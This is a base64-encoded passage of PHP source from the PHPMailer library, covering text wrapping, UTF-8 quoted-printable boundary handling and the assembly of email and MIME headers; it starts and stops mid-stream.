ZvciB1c2Ugd2l0aCBtYWlsZXJzIHRoYXQgZG8gbm90IGF1dG9tYXRpY2FsbHkgcGVyZm9ybSB3cmFwcGluZwogICAgICogYW5kIGZvciBxdW90ZWQtcHJpbnRhYmxlIGVuY29kZWQgbWVzc2FnZXMuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IHBoaWxpcHBlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgVGhlIG1lc3NhZ2UgdG8gd3JhcAogICAgICogQHBhcmFtIGludCAgICAkbGVuZ3RoICBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bwogICAgICogQHBhcmFtIGJvb2wgICAkcXBfbW9kZSBXaGV0aGVyIHRvIHJ1biBpbiBRdW90ZWQtUHJpbnRhYmxlIG1vZGUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gd3JhcFRleHQoJG1lc3NhZ2UsICRsZW5ndGgsICRxcF9tb2RlID0gZmFsc2UpCiAgICB7CiAgICAgICAgaWYgKCRxcF9tb2RlKSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gc3ByaW50ZignID0lcycsIHN0YXRpYzo6JExFKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc29mdF9icmVhayA9IHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICAvL0lmIHV0Zi04IGVuY29kaW5nIGlzIHVzZWQsIHdlIHdpbGwgbmVlZCB0byBtYWtlIHN1cmUgd2UgZG9uJ3QKICAgICAgICAvL3NwbGl0IG11bHRpYnl0ZSBjaGFyYWN0ZXJzIHdoZW4gd2Ugd3JhcAogICAgICAgICRpc191dGY4ID0gc3RhdGljOjpDSEFSU0VUX1VURjggPT09IHN0cnRvbG93ZXIoJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICRsZWxlbiA9IHN0cmxlbihzdGF0aWM6OiRMRSk7CiAgICAgICAgJGNybGZsZW4gPSBzdHJsZW4oc3RhdGljOjokTEUpOwoKICAgICAgICAkbWVzc2FnZSA9IHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRtZXNzYWdlKTsKICAgICAgICAvL1JlbW92ZSBhIHRyYWlsaW5nIGxpbmUgYnJlYWsKICAgICAgICBpZiAoc3Vic3RyKCRtZXNzYWdlLCAtJGxlbGVuKSA9PT0gc3RhdGljOjokTEUpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdWJzdHIoJG1lc3NhZ2UsIDAsIC0kbGVsZW4pOwogICAgICAgIH0KCiAgICAgICAgLy9TcGxpdCBtZXNzYWdlIGludG8gbGluZXMKICAgICAgICAkbGluZXMgPSBleHBsb2RlKHN0YXRpYzo6JExFLCAkbWVzc2FnZSk7CiAgICAgICAgLy9NZXNzYWdlIHdpbGwgYmUgcmVidWlsdCBpbiBoZXJlCiAgICAgICAgJG1lc3NhZ2UgPSAnJzsKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGxpbmUpIHsKICAgICAgICAgICAgJHdvcmRzID0gZXhwbG9kZSgnICcsICRsaW5lKTsKICAgICAgICAgICAgJGJ1ZiA9ICcnOwogICAgICAgICAgICAkZmlyc3R3b3JkID0gdHJ1ZTsKICAgICAgICAgICAgZm9yZWFjaCAoJHdvcmRzIGFzICR3b3JkKSB7CiAgICAgICAgICAgICAgICBpZiAoJHFwX21vZGUgJiYgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmICgnPScgPT09IHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0kbGVuOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCc9JyA9PT0gc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJyAuICRwYXJ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNwcmludGYoJz0lcycsIHN0YXRpYzo6JExFKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHdoaWxlICgkd29yZCAhPT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRsZW5ndGggPD0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRsZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkaXNfdXRmOCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCc9JyA9PT0gc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tJGxlbjsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKCc9JyA9PT0gc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gKHN0cmluZykgc3Vic3RyKCR3b3JkLCAkbGVuKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkd29yZCAhPT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRwYXJ0IC4gc3ByaW50ZignPSVzJywgc3RhdGljOjokTEUpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICRwYXJ0OwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkYnVmX28gPSAkYnVmOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAkd29yZDsKCiAgICAgICAgICAgICAgICAgICAgaWYgKCcnICE9PSAkYnVmX28gJiYgc3RybGVuKCRidWYpID4gJGxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmX28gLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICR3b3JkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRmaXJzdHdvcmQgPSBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gc3RhdGljOjokTEU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG1lc3NhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byAkbWF4TGVuZ3RoIGluIGEgdXRmLTgKICAgICAqIHF1b3RlZC1wcmludGFibGUgZW5jb2RlZCBzdHJpbmcuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IENvbGluIEJyb3duLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kZWRUZXh0IHV0Zi04IFFQIHRleHQKICAgICAqIEBwYXJhbSBpbnQgICAgJG1heExlbmd0aCAgIEZpbmQgdGhlIGxhc3QgY2hhcmFjdGVyIGJvdW5kYXJ5IHByaW9yIHRvIHRoaXMgbGVuZ3RoCiAgICAgKgogICAgICogQHJldHVybiBpbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHV0ZjhDaGFyQm91bmRhcnkoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoKQogICAgewogICAgICAgICRmb3VuZFNwbGl0UG9zID0gZmFsc2U7CiAgICAgICAgJGxvb2tCYWNrID0gMzsKICAgICAgICB3aGlsZSAoISRmb3VuZFNwbGl0UG9zKSB7CiAgICAgICAgICAgICRsYXN0Q2h1bmsgPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrLCAkbG9va0JhY2spOwogICAgICAgICAgICAkZW5jb2RlZENoYXJQb3MgPSBzdHJwb3MoJGxhc3RDaHVuaywgJz0nKTsKICAgICAgICAgICAgaWYgKGZhbHNlICE9PSAkZW5jb2RlZENoYXJQb3MpIHsKICAgICAgICAgICAgICAgIC8vRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgICAgICAgICAgLy9DaGVjayB0aGUgZW5jb2RlZCBieXRlIHZhbHVlICh0aGUgMiBjaGFycyBhZnRlciB0aGUgJz0nKQogICAgICAgICAgICAgICAgJGhleCA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2sgKyAkZW5jb2RlZENoYXJQb3MgKyAxLCAyKTsKICAgICAgICAgICAgICAgICRkZWMgPSBoZXhkZWMoJGhleCk7CiAgICAgICAgICAgICAgICBpZiAoJGRlYyA8IDEyOCkgewogICAgICAgICAgICAgICAgICAgIC8vU2luZ2xlIGJ5dGUgY2hhcmFjdGVyLgogICAgICAgICAgICAgICAgICAgIC8vSWYgdGhlIGVuY29kZWQgY2hhciB3YXMgZm91bmQgYXQgcG9zIDAsIGl0IHdpbGwgZml0CiAgICAgICAgICAgICAgICAgICAgLy9vdGhlcndpc2UgcmVkdWNlIG1heExlbmd0aCB0byBzdGFydCBvZiB0aGUgZW5jb2RlZCBjaGFyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRlbmNvZGVkQ2hhclBvcyA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCAtPSAkbG9va0JhY2sgLSAkZW5jb2RlZENoYXJQb3M7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjID49IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vRmlyc3QgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgLy9SZWR1Y2UgbWF4TGVuZ3RoIHRvIHNwbGl0IGF0IHN0YXJ0IG9mIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggLT0gJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zOwogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjIDwgMTkyKSB7CiAgICAgICAgICAgICAgICAgICAgLy9NaWRkbGUgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyLCBsb29rIGZ1cnRoZXIgYmFjawogICAgICAgICAgICAgICAgICAgICRsb29rQmFjayArPSAzOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgLy9ObyBlbmNvZGVkIGNoYXJhY3RlciBmb3VuZAogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG1heExlbmd0aDsKICAgIH0KCiAgICAvKioKICAgICAqIEFwcGx5IHdvcmQgd3JhcHBpbmcgdG8gdGhlIG1lc3NhZ2UgYm9keS4KICAgICAqIFdyYXBzIHRoZSBtZXNzYWdlIGJvZHkgdG8gdGhlIG51bWJlciBvZiBjaGFycyBzZXQgaW4gdGhlIFdvcmRXcmFwIHByb3BlcnR5LgogICAgICogWW91IHNob3VsZCBvbmx5IGRvIHRoaXMgdG8gcGxhaW4tdGV4dCBib2RpZXMgYXMgd3JhcHBpbmcgSFRNTCB0YWdzIG1heSBicmVhayB0aGVtLgogICAgICogVGhpcyBpcyBjYWxsZWQgYXV0b21hdGljYWxseSBieSBjcmVhdGVCb2R5KCksIHNvIHlvdSBkb24ndCBuZWVkIHRvIGNhbGwgaXQgeW91cnNlbGYuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRXb3JkV3JhcCgpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5Xb3JkV3JhcCA8IDEpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2FsdCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmUnOgogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkFsdEJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICR0aGlzLT5Cb2R5ID0gJHRoaXMtPndyYXBUZXh0KCR0aGlzLT5Cb2R5LCAkdGhpcy0+V29yZFdyYXApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogQXNzZW1ibGUgbWVzc2FnZSBoZWFkZXJzLgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nIFRoZSBhc3NlbWJsZWQgaGVhZGVycwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY3JlYXRlSGVhZGVyKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJyc7CgogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0RhdGUnLCAnJyA9PT0gJHRoaXMtPk1lc3NhZ2VEYXRlID8gc2VsZjo6cmZjRGF0ZSgpIDogJHRoaXMtPk1lc3NhZ2VEYXRlKTsKCiAgICAgICAgLy9UaGUgVG8gaGVhZGVyIGlzIGNyZWF0ZWQgYXV0b21hdGljYWxseSBieSBtYWlsKCksIHNvIG5lZWRzIHRvIGJlIG9taXR0ZWQgaGVyZQogICAgICAgIGlmICgnbWFpbCcgIT09ICR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbykgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U2luZ2xlVG9BcnJheVtdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOwogICAgICAgICAgICB9IGVsc2VpZiAoY291bnQoJHRoaXMtPmNjKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnRnJvbScsIFtbdHJpbSgkdGhpcy0+RnJvbSksICR0aGlzLT5Gcm9tTmFtZV1dKTsKCiAgICAgICAgLy9zZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQ2MgZnJvbSB0aGUgaGVhZGVyIGJlZm9yZSBzZW5kaW5nCiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5jYykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ0NjJywgJHRoaXMtPmNjKTsKICAgICAgICB9CgogICAgICAgIC8vc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IEJjYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcKICAgICAgICBpZiAoCiAgICAgICAgICAgICgKICAgICAgICAgICAgICAgICdzZW5kbWFpbCcgPT09ICR0aGlzLT5NYWlsZXIgfHwgJ3FtYWlsJyA9PT0gJHRoaXMtPk1haWxlciB8fCAnbWFpbCcgPT09ICR0aGlzLT5NYWlsZXIKICAgICAgICAgICAgKQogICAgICAgICAgICAmJiBjb3VudCgkdGhpcy0+YmNjKSA+IDAKICAgICAgICApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7CiAgICAgICAgfQoKICAgICAgICBpZiAoY291bnQoJHRoaXMtPlJlcGx5VG8pID4gMCkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdSZXBseS1UbycsICR0aGlzLT5SZXBseVRvKTsKICAgICAgICB9CgogICAgICAgIC8vbWFpbCgpIHNldHMgdGhlIHN1YmplY3QgaXRzZWxmCiAgICAgICAgaWYgKCdtYWlsJyAhPT0gJHRoaXMtPk1haWxlcikgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSkpOwogICAgICAgIH0KCiAgICAgICAgLy9Pbmx5IGFsbG93IGEgY3VzdG9tIG1lc3NhZ2UgSUQgaWYgaXQgY29uZm9ybXMgdG8gUkZDIDUzMjIgc2VjdGlvbiAzLjYuNAogICAgICAgIC8vaHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzUzMjIjc2VjdGlvbi0zLjYuNAogICAgICAgIGlmICgKICAgICAgICAgICAgJycgIT09ICR0aGlzLT5NZXNzYWdlSUQgJiYKICAgICAgICAgICAgcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICcvXjwoKChbYS16XGQhIyQlJlwnKitcLz0/Xl9ge3x9fi1dKyhcLlthLXpcZCEjJCUmXCcqK1wvPT9eX2B7fH1+LV0rKSopJyAuCiAgICAgICAgICAgICAgICAnfCgiKChbXHgwMS1ceDA4XHgwQlx4MENceDBFLVx4MUZceDdGXXxbXHgyMVx4MjMtXHg1Qlx4NUQtXHg3RV0pJyAuCiAgICAgICAgICAgICAgICAnfChcXFtceDAxLVx4MDlceDBCXHgwQ1x4MEUtXHg3Rl0pKSoiKSlAKChbYS16XGQhIyQlJlwnKitcLz0/Xl9ge3x9fi1dKycgLgogICAgICAgICAgICAgICAgJyhcLlthLXpcZCEjJCUmXCcqK1wvPT9eX2B7fH1+LV0rKSopfChcWygoW1x4MDEtXHgwOFx4MEJceDBDXHgwRS1ceDFGXHg3Rl0nIC4KICAgICAgICAgICAgICAgICd8W1x4MjEtXHg1QVx4NUUtXHg3RV0pfChcXFtceDAxLVx4MDlceDBCXHgwQ1x4MEUtXHg3Rl0pKSpcXSkpKT4kL0RpJywKICAgICAgICAgICAgICAgICR0aGlzLT5NZXNzYWdlSUQKICAgICAgICAgICAgKQogICAgICAgICkgewogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9ICR0aGlzLT5NZXNzYWdlSUQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSBzcHJpbnRmKCc8JXNAJXM+JywgJHRoaXMtPnVuaXF1ZWlkLCAkdGhpcy0+c2VydmVySG9zdG5hbWUoKSk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ01lc3NhZ2UtSUQnLCAkdGhpcy0+bGFzdE1lc3NhZ2VJRCk7CiAgICAgICAgaWYgKG51bGwgIT09ICR0aGlzLT5Qcmlvcml0eSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsKICAgICAgICB9CiAgICAgICAgaWYgKCcnID09PSAkdGhpcy0+WE1haWxlcikgewogICAgICAgICAgICAvL0VtcHR5IHN0cmluZyBmb3IgZGVmYXVsdCBYLU1haWxlciBoZWFkZXIKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgKICAgICAgICAgICAgICAgICdYLU1haWxlcicsCiAgICAgICAgICAgICAgICAnUEhQTWFpbGVyICcgLiBzZWxmOjpWRVJTSU9OIC4gJyAoaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIpJwogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZWlmIChpc19zdHJpbmcoJHRoaXMtPlhNYWlsZXIpICYmIHRyaW0oJHRoaXMtPlhNYWlsZXIpICE9PSAnJykgewogICAgICAgICAgICAvL1NvbWUgc3RyaW5nCiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1gtTWFpbGVyJywgdHJpbSgkdGhpcy0+WE1haWxlcikpOwogICAgICAgIH0gLy9PdGhlciB2YWx1ZXMgcmVzdWx0IGluIG5vIFgtTWFpbGVyIGhlYWRlcgoKICAgICAgICBpZiAoJycgIT09ICR0aGlzLT5Db25maXJtUmVhZGluZ1RvKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0Rpc3Bvc2l0aW9uLU5vdGlmaWNhdGlvbi1UbycsICc8JyAuICR0aGlzLT5Db25maXJtUmVhZGluZ1RvIC4gJz4nKTsKICAgICAgICB9CgogICAgICAgIC8vQWRkIGN1c3RvbSBoZWFkZXJzCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPkN1c3RvbUhlYWRlciBhcyAkaGVhZGVyKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoCiAgICAgICAgICAgICAgICB0cmltKCRoZWFkZXJbMF0pLAogICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcih0cmltKCRoZWFkZXJbMV0pKQogICAgICAgICAgICApOwogICAgICAgIH0KICAgICAgICBpZiAoISR0aGlzLT5zaWduX2tleV9maWxlKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ01JTUUtVmVyc2lvbicsICcxLjAnKTsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBtZXNzYWdlIE1JTUUgdHlwZSBoZWFkZXJzLgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRNYWlsTUlNRSgpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICAgICRpc211bHRpcGFydCA9IHRydWU7CiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCBzdGF0aWM6OkNPTlRFTlRfVFlQRV9NVUxUSVBBUlRfUkVMQVRFRCAuICc7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnIGJvdW5kYXJ5PSInIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhdHRhY2gnOgogICAgICAgICAgICBjYXNlICdpbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9NSVhFRCAuICc7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnIGJvdW5kYXJ5PSInIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsIHN0YXRpYzo6Q09OVEVOVF9UWVBFX01VTFRJUEFSVF9BTFRFUk5BVElWRSAuICc7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnIGJvdW5kYXJ5PSInIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9DYXRjaGVzIGNhc2UgJ3BsYWluJzogYW5kIGNhc2UgJyc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgnQ29udGVudC1UeXBlOiAnIC4gJHRoaXMtPkNvbnRlbnRUeXBlIC4gJzsgY2hhcnNldD0nIC4gJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJGlzbXVsdGlwYXJ0ID0gZmFsc2U7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgLy9SRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKHN0YXRpYzo6RU5DT0RJTkdfN0JJVCAhPT0gJHRoaXMtPkVuY29kaW5nKSB7CiAgICAgICAgICAgIC8vUkZDIDIwNDUgc2VjdGlvbiA2LjQgc2F5cyBtdWx0aXBhcnQgTUlNRSBwYXJ0cyBtYXkgb25seSB1c2UgN2JpdCwgOGJpdCBvciBiaW5hcnkgQ1RFCiAgICAgICAgICAgIGlmICgkaXNtdWx0aXBhcnQpIHsKICAgICAgICAgICAgICAgIGlmIChzdGF0aWM6OkVOQ09ESU5HXzhCSVQgPT09ICR0aGlzLT5FbmNvZGluZykgewogICAgICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHJhbnNmZXItRW5jb2RpbmcnLCBzdGF0aWM6OkVOQ09ESU5HXzhCSVQpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgLy9UaGUgb25seSByZW1haW5pbmcgYWx0ZXJuYXRpdmVzIGFy